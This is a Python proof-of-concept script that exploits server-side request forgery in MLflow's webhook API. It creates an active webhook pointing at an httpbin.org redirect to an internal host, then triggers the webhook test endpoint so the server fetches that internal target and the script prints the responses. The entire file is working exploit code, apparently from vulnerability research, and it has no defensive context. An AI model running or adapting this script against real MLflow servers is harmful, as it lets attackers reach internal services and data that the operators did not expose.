#!/usr/bin/env python3
import requests
import json

MLFLOW_BASE_URL = "http://localhost:5000"
TARGET_URL="http://web-server"
REDIRECT_URL=f"https://httpbin.org/redirect-to?url={TARGET_URL}"

# -----------------------------------------------------------------------------
# STEP 1: Create the Webhook
# -----------------------------------------------------------------------------
create_url = f"{MLFLOW_BASE_URL}/ajax-api/2.0/mlflow/webhooks"
create_payload = {
    "name": "Test",
    "url": REDIRECT_URL,
    "events": [{"entity": "MODEL_VERSION", "action": "CREATED"}],
    "description": "Testing ssrf...?",
    "status": "ACTIVE"
}

print(f"[*] Sending Create Webhook request to {create_url}...")
try:
    response = requests.post(
        create_url,
        data=json.dumps(create_payload),
        timeout=10,
        headers={"Content-Type": "application/json"}
    )

    print(f"[+] Status Code: {response.status_code}")
    print(f"[+] Response Body:\n{response.text}\n")

    if response.status_code != 200:
        print("[-] Failed to create webhook. Exiting.")
        exit(1)

    # Extract the dynamic webhook ID from the response JSON
    webhook_data = response.json()
    webhook_id = webhook_data["webhook"]["webhook_id"]
    print(f"[+] Extracted Webhook ID: {webhook_id}\n")

except Exception as e:
    print(f"[-] Connection Error during Create: {e}")
    exit(1)

# -----------------------------------------------------------------------------
# STEP 2: Test the Webhook
# -----------------------------------------------------------------------------
test_url = f"{MLFLOW_BASE_URL}/ajax-api/2.0/mlflow/webhooks/{webhook_id}/test"
test_payload = {}  # Exact match for the empty JSON body '{}'

print(f"[*] Sending Test Webhook request to {test_url}...")
try:
    test_response = requests.post(
        test_url,
        data=json.dumps(test_payload),
        timeout=10,
        headers={"Content-Type": "application/json"}
    )

    print(f"[+] Status Code: {test_response.status_code}")
    print(f"[+] Response Body:\n{test_response.text}")

except Exception as e:
    print(f"[-] Connection Error during Test: {e}")
